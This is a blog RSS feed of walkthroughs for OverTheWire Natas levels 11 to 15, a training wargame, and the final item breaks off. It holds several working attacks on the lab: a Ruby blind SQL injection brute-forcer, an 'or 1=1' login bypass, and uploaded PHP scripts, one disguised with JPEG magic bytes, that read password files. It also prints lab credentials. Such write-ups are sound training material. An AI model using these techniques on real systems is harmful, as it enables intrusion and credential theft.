<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Natas on Matt Andreko</title>
    <link>https://www.mattandreko.com/categories/natas/index.xml</link>
    <description>Recent content in Natas on Matt Andreko</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <atom:link href="https://www.mattandreko.com/categories/natas/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>OverTheWire Natas Level 15</title>
      <link>https://www.mattandreko.com/blog/2012-11-14-overthewire-natas-level-15/</link>
      <pubDate>Wed, 14 Nov 2012 06:29:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-11-14-overthewire-natas-level-15/</guid>
      <description>&lt;p&gt;Up until now, none of the OverTheWire Natas challenges really gave me that much of an issue. This one however, took me a couple hours to complete. Level 15 is a fun blind sql-injection vulnerability.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;It starts out with a username check dialog, which pretty much only gives you a binary value as to if a username exists or not.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas15_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I looked at the source code, and couldn&amp;rsquo;t see any way to inject some SQL to get it to retrieve the password for me.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt; 
&amp;lt;head&amp;gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://www.overthewire.org/wargames/natas/level.css&amp;quot;&amp;gt;&amp;lt;/head&amp;gt; 
&amp;lt;body&amp;gt; 
&amp;lt;h1&amp;gt;natas15&amp;lt;/h1&amp;gt; 
&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt; 
&amp;lt;? 

/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists(&amp;quot;username&amp;quot;, $_REQUEST)) { 
    $link = mysql_connect(&#39;localhost&#39;, &#39;natas15&#39;, &#39;&amp;lt;censored&amp;gt;&#39;); 
    mysql_select_db(&#39;natas15&#39;, $link); 
     
    $query = &amp;quot;SELECT * from users where username=\&amp;quot;&amp;quot;.$_REQUEST[&amp;quot;username&amp;quot;].&amp;quot;\&amp;quot;&amp;quot;; 
    if(array_key_exists(&amp;quot;debug&amp;quot;, $_GET)) { 
        echo &amp;quot;Executing query: $query&amp;lt;br&amp;gt;&amp;quot;; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) &amp;gt; 0) { 
        echo &amp;quot;This user exists.&amp;lt;br&amp;gt;&amp;quot;; 
    } else { 
        echo &amp;quot;This user doesn&#39;t exist.&amp;lt;br&amp;gt;&amp;quot;; 
    } 
    } else { 
        echo &amp;quot;Error in query.&amp;lt;br&amp;gt;&amp;quot;; 
    } 

    mysql_close($link); 
} else { 
?&amp;gt; 

&amp;lt;form action=&amp;quot;index.php&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt; 
Username: &amp;lt;input name=&amp;quot;username&amp;quot;&amp;gt;&amp;lt;br&amp;gt; 
&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Check existence&amp;quot; /&amp;gt; 
&amp;lt;/form&amp;gt; 
&amp;lt;? } ?&amp;gt; 
&amp;lt;div id=&amp;quot;viewsource&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;index-source.html&amp;quot;&amp;gt;View sourcecode&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt; 
&amp;lt;/div&amp;gt; 
&amp;lt;/body&amp;gt; 
&amp;lt;/html&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I did notice though, that it would verify that a row was returned, so I could inject SQL to brute-force the password. Assuming that the password was 32 digits long (like the previous ones), this could take some time however, since the character set was uppercase, lowercase, and digits. That&amp;rsquo;s up to 62 attempts per digit of the password. I started doing this manually to verify that this was a possibility. With the &amp;ldquo;debug&amp;rdquo; flag on, you can see the query, and that the first digit of the password is not &amp;ldquo;b&amp;rdquo;.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas15_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I cycled through manually all the lowercase and upper case letters. Once I got partially through the numbers, I got a successful hit! This means that the password starts with a &amp;ldquo;3&amp;rdquo;.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas15_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The next step for me, was to automate this process. I decided to write some ruby to accomplish it. This code seems to do the job:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;require &#39;uri&#39;
require &#39;net/http&#39;

url = URI.parse(&amp;quot;http://natas15.natas.labs.overthewire.org/index.php&amp;quot;)
http = Net::HTTP.new(url.host, url.port)
chars = (&#39;a&#39;..&#39;z&#39;).to_a + (&#39;A&#39;..&#39;Z&#39;).to_a + (&#39;0&#39;..&#39;9&#39;).to_a
password = &amp;quot;&amp;quot;
found = false

# 64 was selected, since the password field is a varchar(64)
# Most likely, since all other passwords were 32 digits long, it&#39;ll be that
(1..64).each do |i|
 chars.each do |c| 
  found = false
  request = Net::HTTP::Post.new(url.request_uri)
  request.basic_auth(&amp;quot;natas15&amp;quot;, &amp;quot;m2azll7JH6HS8Ay3SOjG3AGGlDGTJSTV&amp;quot;)
  query = &#39;natas16&amp;quot; AND SUBSTRING(password, &#39; + i.to_s + &#39;, 1) LIKE BINARY &amp;quot;&#39; + c
  request.set_form_data({&amp;quot;username&amp;quot; =&amp;gt; query})
  response = http.request(request)

  if response.body.include?(&amp;quot;This user exists&amp;quot;)
   password += c
   found = true
   puts &amp;quot;Current pass: #{password}&amp;quot;
   break
  end
 end
 # If no letter/number was found, it&#39;s fairly safe to assume it&#39;s done
 break if !found
end

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The output shows:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko$ ruby natas15.rb
Current pass: 3
Current pass: 3V
Current pass: 3Vf
Current pass: 3VfC
Current pass: 3VfCz
Current pass: 3VfCzg
Current pass: 3VfCzga
Current pass: 3VfCzgaW
Current pass: 3VfCzgaWj
Current pass: 3VfCzgaWjE
Current pass: 3VfCzgaWjEA
Current pass: 3VfCzgaWjEAc
Current pass: 3VfCzgaWjEAcm
Current pass: 3VfCzgaWjEAcmC
Current pass: 3VfCzgaWjEAcmCQ
Current pass: 3VfCzgaWjEAcmCQp
Current pass: 3VfCzgaWjEAcmCQph
Current pass: 3VfCzgaWjEAcmCQphi
Current pass: 3VfCzgaWjEAcmCQphiE
Current pass: 3VfCzgaWjEAcmCQphiEP
Current pass: 3VfCzgaWjEAcmCQphiEPo
Current pass: 3VfCzgaWjEAcmCQphiEPoX
Current pass: 3VfCzgaWjEAcmCQphiEPoXi
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9H
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Ht
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Htl
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Htlm
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmV
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3
Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And there you go, the password for level 16 shows up as the last line before it quits.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>OverTheWire Natas Level 14</title>
      <link>https://www.mattandreko.com/blog/2012-11-13-overthewire-natas-level-14/</link>
      <pubDate>Tue, 13 Nov 2012 05:08:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-11-13-overthewire-natas-level-14/</guid>
      <description>&lt;p&gt;The next level of the &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&lt;/a&gt; Natas wargame is &lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas14.shtml&#34;&gt;Level 14&lt;/a&gt;, which introduces &lt;a href=&#34;https://www.owasp.org/index.php/SQL_Injection&#34;&gt;SQL Injection&lt;/a&gt;, a very popular subject as of late.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;The level starts out with a login dialog.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas14_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The source code is fairly straight forward. It&amp;rsquo;s doing a basic authentication query. It however, does have a handy &amp;ldquo;debug&amp;rdquo; flag, that if set, will print the query used to the screen.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt; 
&amp;lt;head&amp;gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://www.overthewire.org/wargames/natas/level.css&amp;quot;&amp;gt;&amp;lt;/head&amp;gt; 
&amp;lt;body&amp;gt; 
&amp;lt;h1&amp;gt;natas14&amp;lt;/h1&amp;gt; 
&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt; 
&amp;lt;? 
if(array_key_exists(&amp;quot;username&amp;quot;, $_REQUEST)) { 
    $link = mysql_connect(&#39;localhost&#39;, &#39;natas14&#39;, &#39;&amp;lt;censored&amp;gt;&#39;); 
    mysql_select_db(&#39;natas14&#39;, $link); 
     
    $query = &amp;quot;SELECT * from users where username=\&amp;quot;&amp;quot;.$_REQUEST[&amp;quot;username&amp;quot;].&amp;quot;\&amp;quot; and password=\&amp;quot;&amp;quot;.$_REQUEST[&amp;quot;password&amp;quot;].&amp;quot;\&amp;quot;&amp;quot;;
    if(array_key_exists(&amp;quot;debug&amp;quot;, $_GET)) { 
        echo &amp;quot;Executing query: $query&amp;lt;br&amp;gt;&amp;quot;; 
    } 

    if(mysql_num_rows(mysql_query($query, $link)) &amp;gt; 0) { 
            echo &amp;quot;Successful login! The password for natas15 is &amp;lt;censored&amp;gt;&amp;lt;br&amp;gt;&amp;quot;; 
    } else { 
            echo &amp;quot;Access denied!&amp;lt;br&amp;gt;&amp;quot;; 
    } 
    mysql_close($link); 
} else { 
?&amp;gt; 

&amp;lt;form action=&amp;quot;index.php&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt; 
Username: &amp;lt;input name=&amp;quot;username&amp;quot;&amp;gt;&amp;lt;br&amp;gt; 
Password: &amp;lt;input name=&amp;quot;password&amp;quot;&amp;gt;&amp;lt;br&amp;gt; 
&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Login&amp;quot; /&amp;gt; 
&amp;lt;/form&amp;gt; 
&amp;lt;? } ?&amp;gt; 
&amp;lt;div id=&amp;quot;viewsource&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;index-source.html&amp;quot;&amp;gt;View sourcecode&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt; 
&amp;lt;/div&amp;gt; 
&amp;lt;/body&amp;gt; 
&amp;lt;/html&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I simply appended the URL with the parameters I wanted. I set the &amp;ldquo;debug&amp;rdquo; flag to a true value, and put in a junk username and password.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas14_2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Since that showed me what query was being ran, I modified it to inject some code (&amp;rdquo; or 1=1 &amp;ndash; ) to return all rows in the table, guaranteeing that at least one entry would show up. This ends up changing the SQL query to do a comparison based on username, OR where 1=1, which is always true. After that, the &amp;ldquo;&amp;ndash; &amp;rdquo; simply comments out the rest of the query, so that no issues arise from stuff later on. Make sure to have a space after the dashes, else it may not work. Once everything was completed, it showed me the password to the next level.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas14_3.png&#34; /&gt;
    
    
&lt;/figure&gt;

</description>
    </item>
    
    <item>
      <title>OverTheWire Natas Level 13</title>
      <link>https://www.mattandreko.com/blog/2012-11-12-overthewire-natas-level-13/</link>
      <pubDate>Mon, 12 Nov 2012 06:44:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-11-12-overthewire-natas-level-13/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas13.shtml&#34;&gt;Level 13&lt;/a&gt; of &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&amp;rsquo;s&lt;/a&gt; Natas wargame is extremely similar to Level 12. The only difference now, is that it&amp;rsquo;s validating that the file is in fact an image. This however is flawed, as exif data can be faked.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;It starts out with a similar upload prompt as last time.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas13_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The source code is super similar to last time.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt; 
&amp;lt;head&amp;gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://www.overthewire.org/wargames/natas/level.css&amp;quot;&amp;gt;&amp;lt;/head&amp;gt; 
&amp;lt;body&amp;gt; 
&amp;lt;h1&amp;gt;natas13&amp;lt;/h1&amp;gt; 
&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt; 
For security reasons, we now only accept image files!&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt; 

&amp;lt;?  

function genRandomString() { 
    $length = 10; 
    $characters = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyz&amp;quot;; 
    $string = &amp;quot;&amp;quot;;     

    for ($p = 0; $p &amp;lt; $length; $p++) { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 

    return $string; 
} 

function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir.&amp;quot;/&amp;quot;.genRandomString().&amp;quot;.&amp;quot;.$ext; 
    } while(file_exists($path)); 
    return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 

if(array_key_exists(&amp;quot;filename&amp;quot;, $_POST)) { 
    $target_path = makeRandomPathFromFilename(&amp;quot;upload&amp;quot;, $_POST[&amp;quot;filename&amp;quot;]); 


        if(filesize($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;]) &amp;gt; 1000) { 
        echo &amp;quot;File is too big&amp;quot;; 
    } else if (! exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])) { 
        echo &amp;quot;File is not an image&amp;quot;; 
    } else { 
        if(move_uploaded_file($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;], $target_path)) { 
            echo &amp;quot;The file &amp;lt;a href=\&amp;quot;$target_path\&amp;quot;&amp;gt;$target_path&amp;lt;/a&amp;gt; has been uploaded&amp;quot;;
        } else{ 
            echo &amp;quot;There was an error uploading the file, please try again!&amp;quot;; 
        } 
    } 
} else { 
?&amp;gt; 

&amp;lt;form enctype=&amp;quot;multipart/form-data&amp;quot; action=&amp;quot;index.php&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt; 
&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;MAX_FILE_SIZE&amp;quot; value=&amp;quot;1000&amp;quot; /&amp;gt; 
&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;filename&amp;quot; value=&amp;quot;&amp;lt;? print genRandomString(); ?&amp;gt;.jpg&amp;quot; /&amp;gt; 
Choose a JPEG to upload (max 1KB):&amp;lt;br/&amp;gt; 
&amp;lt;input name=&amp;quot;uploadedfile&amp;quot; type=&amp;quot;file&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt; 
&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Upload File&amp;quot; /&amp;gt; 
&amp;lt;/form&amp;gt; 
&amp;lt;? } ?&amp;gt; 
&amp;lt;div id=&amp;quot;viewsource&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;index-source.html&amp;quot;&amp;gt;View sourcecode&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt; 
&amp;lt;/div&amp;gt; 
&amp;lt;/body&amp;gt; 
&amp;lt;/html&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Just like last time, I saved the HTML down to my local machine, and made 2 changes, for the url, and the filename.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://www.overthewire.org/wargames/natas/level.css&amp;quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;natas13&amp;lt;/h1&amp;gt;
&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;
For security reasons, we now only accept image files!&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;


&amp;lt;form enctype=&amp;quot;multipart/form-data&amp;quot; action=&amp;quot;http://natas13.natas.labs.overthewire.org/index.php&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;MAX_FILE_SIZE&amp;quot; value=&amp;quot;1000&amp;quot; /&amp;gt;
&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;filename&amp;quot; value=&amp;quot;file.php&amp;quot; /&amp;gt;
Choose a JPEG to upload (max 1KB):&amp;lt;br/&amp;gt;
&amp;lt;input name=&amp;quot;uploadedfile&amp;quot; type=&amp;quot;file&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt;
&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Upload File&amp;quot; /&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;div id=&amp;quot;viewsource&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;index-source.html&amp;quot;&amp;gt;View sourcecode&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The main difference to get around the exif changing in this case, is to put the JPEG magic-bytes into the beginning of the file. I found the JPEG magic-bytes by simply googling the &lt;a href=&#34;http://www.digitalpreservation.gov/formats/fdd/fdd000018.shtml&#34;&gt;JPEG&lt;/a&gt; file format&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I first created a small file that contained the magic bytes.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko$ echo -e &amp;quot;\xff\xd8\xff\xe0&amp;quot; &amp;gt; jpeg_magic
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, I created my PHP script to upload (same as last level, except a new file to read).&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$file = file_get_contents(&#39;/etc/natas_webpass/natas14&#39;);
echo &amp;quot;\n&amp;quot; . $file;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then to combine these files, I just used &amp;ldquo;cat&amp;rdquo;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko$ cat jpeg_magic upload.php &amp;gt; upload2.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then uploaded &amp;ldquo;upload2.php&amp;rdquo; using my local HTML form that I created.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas13_2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Just like that, it let me past the logic to verify it was an image type. Once I clicked on the link to the uploaded file, it showed me the magic-bytes, followed by the password to the next level.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas13_3.png&#34; /&gt;
    
    
&lt;/figure&gt;

</description>
    </item>
    
    <item>
      <title>OverTheWire Natas Level 12</title>
      <link>https://www.mattandreko.com/blog/2012-11-11-overthewire-natas-level-12/</link>
      <pubDate>Sun, 11 Nov 2012 06:27:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-11-11-overthewire-natas-level-12/</guid>
      <description>&lt;p&gt;The next level to attack in the &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&lt;/a&gt; Natas wargame, is &lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas12.shtml&#34;&gt;Level 12&lt;/a&gt;, which is more &amp;ldquo;real-world&amp;rdquo; as well, since developers often forget to limit file extensions.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;It starts out giving you the option to upload a &amp;lt;1KB file to the server.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas12_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;As with any other challenge, I viewed the source, to analyze it.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt; 
&amp;lt;head&amp;gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://www.overthewire.org/wargames/natas/level.css&amp;quot;&amp;gt;&amp;lt;/head&amp;gt; 
&amp;lt;body&amp;gt; 
&amp;lt;h1&amp;gt;natas12&amp;lt;/h1&amp;gt; 
&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt; 
&amp;lt;?  

function genRandomString() { 
    $length = 10; 
    $characters = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyz&amp;quot;; 
    $string = &amp;quot;&amp;quot;;     

    for ($p = 0; $p &amp;lt; $length; $p++) { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 

    return $string; 
} 

function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir.&amp;quot;/&amp;quot;.genRandomString().&amp;quot;.&amp;quot;.$ext; 
    } while(file_exists($path)); 
    return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 

if(array_key_exists(&amp;quot;filename&amp;quot;, $_POST)) { 
    $target_path = makeRandomPathFromFilename(&amp;quot;upload&amp;quot;, $_POST[&amp;quot;filename&amp;quot;]); 


        if(filesize($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;]) &amp;gt; 1000) { 
        echo &amp;quot;File is too big&amp;quot;; 
    } else { 
        if(move_uploaded_file($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;], $target_path)) { 
            echo &amp;quot;The file &amp;lt;a href=\&amp;quot;$target_path\&amp;quot;&amp;gt;$target_path&amp;lt;/a&amp;gt; has been uploaded&amp;quot;;
        } else{ 
            echo &amp;quot;There was an error uploading the file, please try again!&amp;quot;; 
        } 
    } 
} else { 
?&amp;gt; 

&amp;lt;form enctype=&amp;quot;multipart/form-data&amp;quot; action=&amp;quot;index.php&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt; 
&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;MAX_FILE_SIZE&amp;quot; value=&amp;quot;1000&amp;quot; /&amp;gt; 
&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;filename&amp;quot; value=&amp;quot;&amp;lt;? print genRandomString(); ?&amp;gt;.jpg&amp;quot; /&amp;gt; 
Choose a JPEG to upload (max 1KB):&amp;lt;br/&amp;gt; 
&amp;lt;input name=&amp;quot;uploadedfile&amp;quot; type=&amp;quot;file&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt; 
&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Upload File&amp;quot; /&amp;gt; 
&amp;lt;/form&amp;gt; 
&amp;lt;? } ?&amp;gt; 
&amp;lt;div id=&amp;quot;viewsource&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;index-source.html&amp;quot;&amp;gt;View sourcecode&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt; 
&amp;lt;/div&amp;gt; 
&amp;lt;/body&amp;gt; 
&amp;lt;/html&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The filename of the uploaded file is a randomly generated .jpg file, based on the hidden input in the HTML. To change that, there are a few ways, but I simply did the old-school method of saving the HTML to my desktop, and modifying it, since there was no code to verify the HTTP Referer. I made the code read:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://www.overthewire.org/wargames/natas/level.css&amp;quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;natas12&amp;lt;/h1&amp;gt;
&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;

&amp;lt;form enctype=&amp;quot;multipart/form-data&amp;quot; action=&amp;quot;http://natas12.natas.labs.overthewire.org/index.php&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;MAX_FILE_SIZE&amp;quot; value=&amp;quot;1000&amp;quot; /&amp;gt;
&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;filename&amp;quot; value=&amp;quot;hostess.php&amp;quot; /&amp;gt;
Choose a JPEG to upload (max 1KB):&amp;lt;br/&amp;gt;
&amp;lt;input name=&amp;quot;uploadedfile&amp;quot; type=&amp;quot;file&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt;
&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Upload File&amp;quot; /&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;div id=&amp;quot;viewsource&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;index-source.html&amp;quot;&amp;gt;View sourcecode&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I had really only changed the filename to be a .php extension, since it will still be randomly assigned a filename, but keep the extension. The other change was simply to make it submit to the full URL of the site.&lt;/p&gt;

&lt;p&gt;I then opened up the HTML file in my browser, and selected a PHP file that I had made just for this level. It simply reads the password file for the next level, and prints it to the screen. The code for it is as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$file = file_get_contents(&#39;/etc/natas_webpass/natas13&#39;);
echo $file;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas12_2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Once that uploaded, it gave me a link to the newly uploaded file.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas12_3.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Once the newly uploaded file executed, it wrote out the contents of the next level&amp;rsquo;s password.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas12_4.png&#34; /&gt;
    
    
&lt;/figure&gt;

</description>
    </item>
    
    <item>
      <title>OverTheWire Natas Level 11</title>
      <link>https://www.mattandreko.com/blog/2012-11-10-overthewire-natas-level-11/</link>
      <pubDate>Sat, 10 Nov 2012 05:34:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-11-10-overthewire-natas-level-11/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas11.shtml&#34;&gt;Level 11&lt;/a&gt; of the &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&lt;/a&gt; Natas wargames is a good one. It wasn&amp;rsquo;t one that could instantly be solved either. It involved programming, encryption, and HTTP. All fun!&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;It started with a dialog to set the background color. When you click the &amp;ldquo;Set Color&amp;rdquo; button, it sets a cookie in your browser. But as the dialog says, the cookie is protected.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/natas11_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I looked at the source code, as I always do. It was a little more lengthy than previous levels.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;amp;lt;html&amp;amp;gt;
&amp;amp;lt;head&amp;amp;gt;&amp;amp;lt;link&amp;amp;nbsp;rel=&amp;quot;stylesheet&amp;quot;&amp;amp;nbsp;type=&amp;quot;text/css&amp;quot;&amp;amp;nbsp;href=&amp;quot;http://www.overthewire.org/wargames/natas/level.css&amp;quot;&amp;amp;gt;&amp;amp;lt;/head&amp;amp;gt;
